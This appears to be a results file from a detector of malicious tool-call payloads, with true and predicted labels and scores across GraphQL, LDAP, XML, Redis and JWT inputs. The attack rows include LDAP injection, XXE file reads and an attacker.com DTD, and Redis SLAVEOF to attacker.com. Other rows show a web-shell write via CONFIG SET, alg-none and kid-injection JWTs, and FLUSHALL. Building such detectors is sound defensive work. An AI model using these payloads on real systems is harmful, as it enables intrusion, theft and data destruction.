tool_name,payload,true_label,pred_label,confidence,dist_benign,dist_attack
graphql_query,"{""query"": ""query { user(id: 32) { name email } }""}",benign,benign,0.8487424884385084,0.01009070873260498,0.016772806644439697
graphql_query,"{""query"": ""query { posts(first: 15) { edges { node { title } } } }"", ""variables""",benign,benign,0.6459880997551951,0.02908766269683838,0.03189200162887573
graphql_query,"{""query"": ""mutation { updateItem(id: 16, status: \""active\"") { id } }""}",benign,attack,0.5294629997822053,0.025583624839782715,0.025244593620300293
graphql_query,"{""query"": ""mutation { createPost(title: \""Hello\"") { id } }""}",benign,attack,0.675095362874025,0.020821809768676758,0.019234001636505127
graphql_query,"{""query"": ""query GetUser($id: ID!) { user(id: $id) { name } }"", ""variables"": {""i",benign,benign,0.752801781468464,0.026585936546325684,0.036176085472106934
graphql_query,"{""query"": ""query { product(id: 36) { name price } }""}",benign,benign,1.0,0.01038450002670288,0.026087403297424316
graphql_query,"{""query"": ""query { comments(postId: 30) { id text } }""}",benign,benign,0.749817670004439,0.014021873474121094,0.01896369457244873
graphql_query,"{""query"": ""query { comments(postId: 26) { id text } }""}",benign,benign,0.7396478696727609,0.014349162578582764,0.019007325172424316
graphql_query,"{""query"": ""query { user(id: 2) { name email } }"", ""variables"": {""id"": ""123""}}",benign,benign,0.7584749562043549,0.016998291015625,0.023400485515594482
graphql_query,"{""query"": ""mutation { updateItem(id: 12, status: \""active\"") { id } }""}",benign,attack,0.5478343854788283,0.02690303325653076,0.02632659673690796
graphql_query,"{""query"": ""mutation { updateUser(id: 1, name: \""John\"") { id } }""}",benign,attack,0.592534499882009,0.024818599224090576,0.02588069438934326
graphql_query,"{""query"": ""query { orders(status: PENDING) { id total } }""}",benign,benign,0.903395460887829,0.013155221939086914,0.024614334106445312
graphql_query,"{""query"": ""query { order(id: 28) { total status } }""}",benign,benign,0.989019891147771,0.009813666343688965,0.02231067419052124
graphql_query,"{""query"": ""query { users { email passwordHash } }""}",attack,attack,1.0,0.028891324996948242,0.010428965091705322
graphql_query,"{""query"": ""query { users(first: 999999999) { edges { node { id } } } }""}",attack,attack,0.6830188021508264,0.042185187339782715,0.038828492164611816
graphql_query,"{""query"": ""{\""query\"": \""query { user(id: \\\""1 OR 1=1\\\"") { name } }\""}""}",attack,attack,1.0,0.0621524453163147,0.064189612865448
graphql_query,"{""query"": ""query { auditLogs { action userId ipAddress } }""}",attack,attack,0.9735855000851816,0.04530620574951172,0.020661592483520508
graphql_query,"{""query"": ""mutation { deleteAllUsers { count } }""}",attack,attack,0.8924532913358129,0.03110969066619873,0.017030835151672363
graphql_query,"{""query"": ""query { __schema { types { name fields { name } } } }""}",attack,attack,0.5327985961438884,0.024009883403778076,0.023655951023101807
graphql_query,"{""query"": ""query { __type(name: \""User\"") { fields { name type { name } } } }""}",attack,benign,0.6778795811544782,0.023868799209594727,0.0279005765914917
graphql_query,"{""query"": ""query { admin { apiKey secretToken } }""}",attack,attack,1.0,0.027434349060058594,0.009416759014129639
graphql_query,"{""query"": ""query x($id: String!) { user(id: $id) { name } }"", ""variables"": {""id""",attack,benign,0.6806487870175023,0.023878931999206543,0.0280684232711792
graphql_query,"{""query"": ""query { a]};alert(1)// }""}",attack,attack,0.5090390905467699,0.02835536003112793,0.028471648693084717
ldap_query,"{""filter"": ""(cn=User 18)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.9867398344325637,0.005114078521728516,0.011564254760742188
ldap_query,"{""filter"": ""(objectClass=person)"", ""base"": ""dc=example,dc=com""}",benign,attack,0.8066563489963563,0.0188332200050354,0.012382328510284424
ldap_query,"{""filter"": ""(uid=user14)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,1.0,0.007490634918212891,0.02283257246017456
ldap_query,"{""filter"": ""(title=Engineer)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.8662416757076085,0.022554457187652588,0.03892207145690918
ldap_query,"{""filter"": ""(mail=user12@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.9328235458296772,0.01703166961669922,0.03402429819107056
ldap_query,"{""filter"": ""(sn=Smith)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.9729179793127557,0.012338876724243164,0.027014434337615967
ldap_query,"{""filter"": ""(&(department=IT)(active=true))"", ""base"": ""ou=employees,dc=corp,dc=n",benign,attack,0.6342783721786567,0.013559103012084961,0.01597285270690918
ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.5269899414431645,0.009945511817932129,0.010277748107910156
ldap_query,"{""filter"": ""(telephoneNumber=*)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,benign,0.7270898883959268,0.011310458183288574,0.014603912830352783
ldap_query,"{""filter"": ""(mail=user34@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.920782504654695,0.01896357536315918,0.036875903606414795
ldap_query,"{""filter"": ""(&(department=dept4)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.5465435533951825,0.011184275150299072,0.010568022727966309
ldap_query,"{""filter"": ""(cn=John Doe)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,benign,0.9997924376591347,0.008153140544891357,0.019014596939086914
ldap_query,"{""filter"": ""(cn=User 28)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.9661476396326802,0.005431652069091797,0.011706888675689697
ldap_query,"{""filter"": ""(uid=john)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.888589089672244,0.004953861236572266,0.008973002433776855
ldap_query,"{""filter"": ""(mail=user6@example.com)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.919959477169195,0.013806343078613281,0.026798129081726074
ldap_query,"{""filter"": ""(employeeNumber=2)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.7967977176452841,0.01460033655166626,0.021754980087280273
ldap_query,"{""filter"": ""(uid=user36)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,1.0,0.006830573081970215,0.021640658378601074
ldap_query,"{""filter"": ""(mail=user16@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.9298055261958027,0.017313480377197266,0.034353554248809814
ldap_query,"{""filter"": ""(employeeNumber=20)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.8507365188368985,0.014469146728515625,0.024153172969818115
ldap_query,"{""filter"": ""(employeeNumber=22)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.8277996888688613,0.014070093631744385,0.02237147092819214
ldap_query,"{""filter"": ""(mail=user32@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.8099078937515009,0.014981746673583984,0.022942304611206055
ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,attack,0.6655438134838637,0.013488173484802246,0.01651102304458618
ldap_query,"{""filter"": ""(&(department=dept6)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,attack,0.6263565981489401,0.015127241611480713,0.017648041248321533
ldap_query,"{""filter"": ""(mail=*@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.7279596548021299,0.015023231506347656,0.019432127475738525
ldap_query,"{""filter"": ""(employeeNumber=0)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.9279844632160484,0.0064626336097717285,0.01277095079421997
ldap_query,"{""filter"": ""(uid=user8)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,1.0,0.004477083683013916,0.01361018419265747
ldap_query,"{""filter"": ""(employeeNumber=24)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.9485793587895892,0.015233755111694336,0.03153711557388306
ldap_query,"{""filter"": ""\\00*)(uid=admin"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.5119284400456786,0.012436330318450928,0.01261824369430542
ldap_query,"{""filter"": ""(uid=admin)"", ""base"": ""ou=admins,dc=corp,dc=net""}",attack,attack,0.607987891395324,0.013090848922729492,0.014932870864868164
ldap_query,"{""filter"": ""(objectClass=*)"", ""base"": ""cn=admin,dc=example,dc=com""}",attack,attack,0.9918102309556154,0.017781376838684082,0.007770061492919922
ldap_query,"{""filter"": ""*)(|(objectClass=*))"", ""base"": ""dc=corp,dc=net""}",attack,attack,1.0,0.026483118534088135,0.007898271083831787
ldap_query,"{""filter"": ""(memberOf=cn=Domain Admins)"", ""base"": ""dc=example,dc=com""}",attack,attack,0.5170293498922381,0.009014010429382324,0.009202837944030762
ldap_query,"{""filter"": ""admin)(|(password=*)"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.6919767681095933,0.013157129287719727,0.010403931140899658
ldap_query,"{""filter"": ""*)(objectClass=*"", ""base"": ""dc=example,dc=com""}",attack,attack,1.0,0.02535879611968994,0.008963525295257568
ldap_query,"{""filter"": "")(cn=*)(|(cn=*"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.8979127964960911,0.034802019596099854,0.018825650215148926
ldap_query,"{""filter"": ""*)(uid=*))(|(uid=*"", ""base"": ""dc=example,dc=com""}",attack,attack,1.0,0.026679039001464844,0.010506749153137207
parse_xml,"{""xml"": ""<config><item id=\""18\"">value</item></config>""}",benign,benign,1.0,0.01071321964263916,0.025441229343414307
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>12</id></data>""}",benign,benign,0.9634980434200551,0.012754857540130615,0.027323126792907715
parse_xml,"{""xml"": ""<users><user id=\""1\""><name>John</name></user></users>""}",benign,benign,0.9538916091511527,0.014087557792663574,0.029519855976104736
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>2</id></data>""}",benign,benign,0.9438062298754606,0.013203084468841553,0.0270383358001709
parse_xml,"{""xml"": ""<users><user id=\""10\""><name>User10</name></user></users>""}",benign,benign,0.9384669734669762,0.015940189361572266,0.03225147724151611
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 22</message></response>""}",benign,benign,0.8324094538646315,0.021733462810516357,0.03489428758621216
parse_xml,"{""xml"": ""<order id=\""8\""><status>pending</status></order>""}",benign,benign,0.8743412760806208,0.019835591316223145,0.03483361005783081
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 28</message></response>""}",benign,benign,0.8216983949335956,0.021830320358276367,0.03426700830459595
parse_xml,"{""xml"": ""<note><to>User</to><from>Admin</from><body>Hello</body></note>""}",benign,benign,0.8118947540836299,0.030719220638275146,0.047237932682037354
parse_xml,"{""xml"": ""<order id=\""24\""><status>pending</status></order>""}",benign,benign,0.8731875506853393,0.02063775062561035,0.036152005195617676
parse_xml,"{""xml"": ""<feed><entry><title>Hello</title></entry></feed>""}",benign,benign,0.8758757252830087,0.02794700860977173,0.04924142360687256
parse_xml,"{""xml"": ""<order><id>123</id><items><item>Book</item></items></order>""}",benign,benign,0.9192412052558762,0.029210209846496582,0.056606411933898926
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><item>test</item></data>""}",benign,benign,1.0,0.01146787405014038,0.028926372528076172
parse_xml,"{""xml"": ""<users><user id=\""16\""><name>User16</name></user></users>""}",benign,benign,0.908145963866131,0.017026185989379883,0.03219282627105713
parse_xml,"{""xml"": ""<config><item id=\""30\"">value</item></config>""}",benign,benign,1.0,0.010693907737731934,0.026905417442321777
parse_xml,"{""xml"": ""<users><user id=\""26\""><name>User26</name></user></users>""}",benign,benign,0.9098627751861996,0.01573401689529419,0.02986276149749756
parse_xml,"{""xml"": ""<products><product><name>Widget</name><price>9.99</price></product></pr",benign,benign,0.7993954675349842,0.05119842290878296,0.07670098543167114
parse_xml,"{""xml"": ""<config><item id=\""0\"">value</item></config>""}",benign,benign,1.0,0.010659992694854736,0.026428163051605225
parse_xml,"{""xml"": ""<config><item id=\""6\"">value</item></config>""}",benign,benign,1.0,0.010397613048553467,0.02616429328918457
parse_xml,"{""xml"": ""<response status=\""ok\""><message>Success</message></response>""}",benign,benign,0.8495183012874563,0.022925853729248047,0.03817051649093628
parse_xml,"{""xml"": ""<config><setting name=\""debug\"">false</setting></config>""}",benign,attack,0.670374419468012,0.02071225643157959,0.026283860206604004
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>4</id></data>""}",benign,benign,0.9390369798030089,0.013073086738586426,0.02648460865020752
parse_xml,"{""xml"": ""<config><item id=\""20\"">value</item></config>""}",benign,benign,1.0,0.009755492210388184,0.0258786678314209
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 14</message></response>""}",benign,benign,0.8372443335122033,0.02101588249206543,0.03408926725387573
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///et",attack,attack,1.0,0.05813676118850708,0.019448518753051758
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://169.",attack,attack,0.9157757481566494,0.04256868362426758,0.022136390209197998
parse_xml,"{""xml"": ""<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode",attack,attack,1.0,0.04629838466644287,0.018016159534454346
parse_xml,"{""xml"": ""<credentials><username>admin</username><password>secret</password></cre",attack,attack,0.6504418773308159,0.032707810401916504,0.04035651683807373
parse_xml,"{""xml"": ""<config><apiKey>sk-xxx</apiKey></config>""}",attack,attack,0.5486811139900747,0.032609522342681885,0.034896254539489746
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/",attack,attack,1.0,0.04037642478942871,0.008980631828308105
parse_xml,"{""xml"": ""<!DOCTYPE :[ <!ENTITY x SYSTEM \""file:///dev/random\""> ]><x>&x;</x>""}",attack,attack,0.9369236486800793,0.03262650966644287,0.0161818265914917
parse_xml,"{""xml"": ""<!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%d",attack,attack,1.0,0.061163485050201416,0.023175597190856934
redis_command,"{""command"": ""GET"", ""args"": [""session:18""]}",benign,benign,0.9524762090521787,0.007114410400390625,0.014859795570373535
redis_command,"{""command"": ""GET"", ""args"": [""session:22""]}",benign,benign,0.9900094587383959,0.006848752498626709,0.015606522560119629
redis_command,"{""command"": ""HGET"", ""args"": [""user:28"", ""name""]}",benign,benign,0.7354555879846774,0.00933527946472168,0.0122605562210083
redis_command,"{""command"": ""HSET"", ""args"": [""user:1"", ""email"", ""john@example.com""]}",benign,attack,0.7391546309180907,0.030876994132995605,0.023333370685577393
redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:14"", ""3600""]}",benign,benign,0.7677775359862925,0.019208431243896484,0.02695333957672119
redis_command,"{""command"": ""HGET"", ""args"": [""user:6"", ""name""]}",benign,benign,0.7023928624737786,0.009301245212554932,0.011423289775848389
redis_command,"{""command"": ""INCR"", ""args"": [""counter""]}",benign,attack,0.5971703140502566,0.01448148488998413,0.013864994049072266
redis_command,"{""command"": ""INCR"", ""args"": [""counter:38""]}",benign,benign,0.8078228775002883,0.01254361867904663,0.01912510395050049
redis_command,"{""command"": ""SADD"", ""args"": [""tags"", ""python""]}",benign,attack,0.7837478684780163,0.01904308795928955,0.013131141662597656
redis_command,"{""command"": ""ZADD"", ""args"": [""leaderboard"", ""100"", ""user1""]}",benign,attack,0.5943981388409125,0.02363497018814087,0.022656917572021484
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:0"", ""task0""]}",benign,attack,0.6706083129967894,0.01684272289276123,0.01818007230758667
redis_command,"{""command"": ""HGET"", ""args"": [""user:10"", ""name""]}",benign,benign,0.6982825343369231,0.010715126991271973,0.01305091381072998
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue"", ""task1""]}",benign,attack,0.5619083106957068,0.016642630100250244,0.016187727451324463
redis_command,"{""command"": ""HGET"", ""args"": [""user:1"", ""name""]}",benign,benign,0.6587829250682148,0.010891318321228027,0.012251734733581543
redis_command,"{""command"": ""SET"", ""args"": [""cache:page"", ""data""]}",benign,benign,0.8299591290510554,0.012630283832550049,0.02017390727996826
redis_command,"{""command"": ""GET"", ""args"": [""session:123""]}",benign,benign,1.0,0.006087958812713623,0.01424795389175415
redis_command,"{""command"": ""GET"", ""args"": [""session:2""]}",benign,benign,0.914681884382013,0.007276177406311035,0.013958275318145752
redis_command,"{""command"": ""INCR"", ""args"": [""counter:20""]}",benign,benign,0.7838940502482508,0.01320868730545044,0.019161343574523926
redis_command,"{""command"": ""SET"", ""args"": [""cache:page:36"", ""data""]}",benign,benign,0.9589312761768843,0.01103222370147705,0.023386001586914062
redis_command,"{""command"": ""INCR"", ""args"": [""counter:30""]}",benign,benign,0.8044465851322485,0.01404029130935669,0.021256625652313232
redis_command,"{""command"": ""INCR"", ""args"": [""counter:32""]}",benign,benign,0.8668819552944744,0.010966718196868896,0.01895129680633545
redis_command,"{""command"": ""SET"", ""args"": [""cache:page:4"", ""data""]}",benign,benign,0.9347727448125378,0.011633694171905518,0.023342907428741455
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:3"", ""task8""]}",benign,benign,0.6649213997260492,0.016316652297973633,0.01858234405517578
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:1"", ""task26""]}",benign,benign,0.6759627952706455,0.01663738489151001,0.01937282085418701
redis_command,"{""command"": ""INCR"", ""args"": [""counter:12""]}",benign,benign,0.8007932695387086,0.012754678726196289,0.019163668155670166
redis_command,"{""command"": ""INCR"", ""args"": [""counter:24""]}",benign,benign,0.8237067482802555,0.012489914894104004,0.019688427448272705
redis_command,"{""command"": ""TTL"", ""args"": [""session:123""]}",benign,benign,0.8231426863980544,0.011665165424346924,0.018366515636444092
redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:16"", ""3600""]}",benign,benign,0.7976110454435106,0.016744494438171387,0.02499210834503174
redis_command,"{""command"": ""EXPIRE"", ""args"": [""cache:key"", ""3600""]}",benign,benign,0.9848328528458292,0.009791672229766846,0.022042512893676758
redis_command,"{""command"": ""GET"", ""args"": [""session:34""]}",benign,benign,1.0,0.005925178527832031,0.015401065349578857
redis_command,"{""command"": ""DEBUG"", ""args"": [""SEGFAULT""]}",attack,attack,0.9278818528499146,0.036911189556121826,0.018682897090911865
redis_command,"{""command"": ""KEYS"", ""args"": [""*""]}",attack,benign,0.7119606235132916,0.012766122817993164,0.01598513126373291
redis_command,"{""command"": ""EVAL"", ""args"": [""return os.execute('id')"", ""0""]}",attack,attack,0.7004000643117277,0.02565741539001465,0.020975470542907715
redis_command,"{""command"": ""MODULE"", ""args"": [""LOAD"", ""/tmp/malicious.so""]}",attack,attack,0.7810867003551889,0.02676379680633545,0.018556833267211914
redis_command,"{""command"": ""CONFIG"", ""args"": [""GET"", ""requirepass""]}",attack,attack,0.8595118816934617,0.01828104257583618,0.010747730731964111
redis_command,"{""command"": ""FLUSHALL"", ""args"": []}",attack,attack,0.8382791774274087,0.02128499746322632,0.013093352317810059
redis_command,"{""command"": ""SLAVEOF"", ""args"": [""attacker.com"", ""6379""]}",attack,attack,0.7800950417586942,0.03356921672821045,0.0233231782913208
redis_command,"{""command"": ""INFO"", ""args"": []}",attack,attack,0.6450631983402656,0.015208005905151367,0.013896465301513672
redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dir"", ""/var/www/html""]}",attack,attack,0.8610398985448124,0.03179001808166504,0.018628716468811035
redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dbfilename"", ""shell.php""]}",attack,attack,0.8789536732626475,0.03933095932006836,0.022173941135406494
verify_jwt,"{""token"": ""eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidGVzdCJ9.sig""}",benign,benign,0.9232853501830988,0.011330962181091309,0.02215719223022461
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005948960781097412,0.0187302827835083
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005248844623565674,0.01865476369857788
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.00477975606918335,0.016735196113586426
verify_jwt,"{""token"": ""eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmFuZSJ9.sig""}",benign,attack,0.6988166881923261,0.01178056001663208,0.01628774404525757
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005052030086517334,0.015657782554626465
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.0058335065841674805,0.016327857971191406
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005943655967712402,0.01788461208343506
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.00503772497177124,0.01657778024673462
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005118131637573242,0.015841186046600342
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.sig""}",benign,attack,0.6357625024532653,0.020457029342651367,0.01641404628753662
verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJhcHAiLCJzdWIiOiJ1c2Vy",benign,attack,0.6497199814423529,0.03848457336425781,0.030181169509887695
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005186915397644043,0.016557931900024414
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005361080169677734,0.018294930458068848
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005934417247772217,0.017866909503936768
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.004617750644683838,0.015390098094940186
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFt",benign,attack,1.0,0.05501580238342285,0.04315108060836792
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.00506061315536499,0.01597219705581665
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.004910647869110107,0.01746267080307007
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.0058209896087646484,0.01877009868621826
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.00556570291519165,0.017374098300933838
verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inwgc2xlZXAgMTAgfCJ9.eyJy",attack,attack,0.9428420569554437,0.02639162540435791,0.012915492057800293
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig"", ""ke",attack,attack,0.5863309363119229,0.03363502025604248,0.02925020456314087
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5IjoieHh4In0.sig""}",attack,attack,0.5463603373107624,0.020971596240997314,0.022603213787078857
verify_jwt,"{""token"": ""eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.""}",attack,attack,1.0,0.04869365692138672,0.014136075973510742
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJrIjoiY",attack,attack,0.920281416473437,0.04094952344894409,0.021081984043121338
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd",attack,attack,0.8562886591689618,0.03526031970977783,0.0208737850189209
